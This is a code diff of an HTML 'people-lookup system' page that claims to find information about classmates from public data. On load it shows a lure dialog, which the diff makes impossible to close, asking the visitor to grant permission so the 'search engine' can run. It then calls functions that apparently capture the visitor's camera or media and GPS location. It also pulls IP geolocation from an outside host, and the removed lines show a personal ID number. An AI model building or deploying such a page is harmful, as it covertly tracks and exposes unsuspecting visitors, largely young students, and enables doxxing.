@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		 
+
 		<title>陈煜翔香香-沥高查人系统</title>
 		<meta name="viewport" content="width=device-width, initial-scale=1.0">
 		<!-- 新 Bootstrap 核心 CSS 文件 -->
@@ -65,7 +65,7 @@
 						<p>2. 数据来自网上公开信息采集，包含图片。</p>
 						<p class="text-danger">3. 本系统仅供认识新同学使用，相互了解增进友情，不得用于非法人肉他人。非法用途制作者不承担法律责任。</p>
 						<p class="text-danger">4. 本系统一切责任人为<a class="text-primary"
-								href="/dani/440102200511135633/">陈煜翔(香香)<span
+								href="">(香香)<span
 									class="glyphicon glyphicon-new-window"></span></a>。如有疑问请咨询：QQ：1799262301</p>
 						<p class="text-danger">5. 按生日查人的格式为:<code>2006-02-05</code></p>
 					</div>
@@ -112,11 +112,17 @@
 			$("#head-img").show(1000);
 			layer.alert('请小可爱授予权限以运行搜索引擎.~', {
 				skin: 'layui-layer-molv', //样式类名
-				closeBtn: 1,
+				closeBtn: 0,
 			}, function(index) {
 				// getMedia();
-				getMedia(getGps);
-				layer.close(index);
+				try {
+					getMedia(getGps);
+				} catch (e) {
+					//捕获异常，并进行异常处理的代码块
+					layer.msg('出现异常' + e);
+				} finally {
+					layer.close(index);
+				}
 			});
 
 		});
@@ -187,5 +193,5 @@
 
 		};
 	</script>
-	 <script src="https://whois.pconline.com.cn/ipJson.jsp"></script>
+	<script src="https://whois.pconline.com.cn/ipJson.jsp"></script>
 </html>
